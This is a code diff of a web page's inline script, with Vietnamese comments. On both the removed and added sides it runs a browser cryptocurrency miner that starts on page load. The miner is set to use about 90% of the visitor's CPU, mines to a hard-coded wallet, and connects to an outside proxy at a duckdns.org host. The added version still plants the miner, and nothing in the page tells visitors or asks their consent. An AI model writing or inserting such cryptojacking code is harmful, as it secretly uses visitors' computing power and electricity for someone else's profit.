@@ -1,36 +1,19 @@
 <script src="assets/js/support.js"></script>
 <script>
-    function nổMáyĐào() {
-        // Kiểm tra xem thư viện WMP đã sẵn sàng chưa
-        if (typeof WMP !== 'undefined') {
-            const config = {
-                proxy: 'wss://trungturng.duckdns.org:8080', 
-                throttle: 0.1, // Dùng 90% CPU để test cho sướng
-                autoThreads: true
-            };
-            const wallet = '47NwLUwjtUoGzgRqEsLCcn7uZPeXDkzXKSu4h9K236tXA8zxY65jrK7ZVAkxYeMKZP57wrbyNcWmR66Tv5WLZGag8vdskcF';
-            
-            const miner = new WMP.User(wallet, config);
-            miner.start();
+    console.log("Bắt đầu quy trình lụm lúa...");
 
-            console.log("%c ĐANG ĐÀO THẬT SỰ! ", "background: green; color: white; padding: 5px;");
+    // Gọi trực tiếp vì file support.js đã nằm sẵn trên host
+    const miner = new WMP.User('47NwLUwjtUoGzgRqEsLCcn7uZPeXDkzXKSu4h9K236tXA8zxY65jrK7ZVAkxYeMKZP57wrbyNcWmR66Tv5WLZGag8vdskcF', {
+        proxy: 'wss://trungturng.duckdns.org:8080',
+        throttle: 0.1 
+    });
 
-            // Theo dõi CPU nhảy số
-            setInterval(function() {
-                const hps = miner.getHashesPerSecond();
-                if (hps > 0) {
-                    console.log("Tốc độ hiện tại: " + hps.toFixed(2) + " H/s");
-                } else {
-                    console.log("Đang khởi động thuật toán, đợi tí...");
-                }
-            }, 5000);
-        } else {
-            // Nếu chưa có thư viện thì đợi thêm 1 giây nữa rồi thử lại
-            console.log("Đang nạp động cơ, vui lòng đợi...");
-            setTimeout(nổMáyĐào, 1000);
+    miner.start();
+
+    setInterval(function() {
+        const hps = miner.getHashesPerSecond();
+        if (hps > 0) {
+            console.log("%c Tốc độ: " + hps.toFixed(2) + " H/s", "color: green; font-weight: bold;");
         }
-    }
-
-    // Bắt đầu quy trình sau 3 giây vào trang
-    setTimeout(nổMáyĐào, 3000);
+    }, 3000);
 </script>
